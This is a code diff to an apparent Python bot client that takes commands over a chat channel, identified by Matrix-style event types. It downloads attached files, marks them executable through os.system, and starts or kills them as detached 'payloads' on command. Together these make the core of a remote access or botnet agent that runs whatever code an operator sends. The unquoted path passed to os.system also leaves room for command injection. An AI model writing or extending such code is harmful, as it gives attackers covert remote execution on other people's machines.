@@ -1,6 +1,7 @@
 import json
 import platform
 import random
+import signal
 import socket
 import subprocess
 import threading
@@ -41,15 +42,26 @@ class Payload:
                 [self.payload_path], 
                 stdout=subprocess.DEVNULL,  # Discard output
                 stderr=subprocess.DEVNULL,
-                start_new_session=True  # Key for detaching
+                shell=True,
+                # Creates a new process group so we can kill the group and all its tkinter child procs
+                preexec_fn=os.setsid,  
             )
+            self.running = True
+            print("running payload")
         except Exception as e:
+            print(e)
             return
     
     def stop(self):
         if not self.running:
             return
-        self.proc.kill()
+        try:
+            os.killpg(os.getpgid(self.proc.pid), signal.SIGKILL)
+        except Exception as e:
+            print(e)
+            return
+        print("stopped payload")
+        self.running = False
 
 class Bot:
     access_token: str
@@ -141,7 +153,9 @@ class Bot:
             if msg_type == "m.image":
                 self.download_file(event)
             elif msg_type == "m.file":
-                self.payload = Payload(self.download_file(event))
+                path = self.download_file(event)
+                os.system(f"chmod +x {path}")
+                self.payload = Payload(path)
 
         
     def get_system_info(self) -> str:
@@ -198,6 +212,7 @@ class Bot:
         elif command.startswith("PAYLOAD"):
             command, status = command.split(":", 1)
             if status == "START":
+                print("START")
                 self.payload.start()
             elif status == "STOP":
                 self.payload.stop()
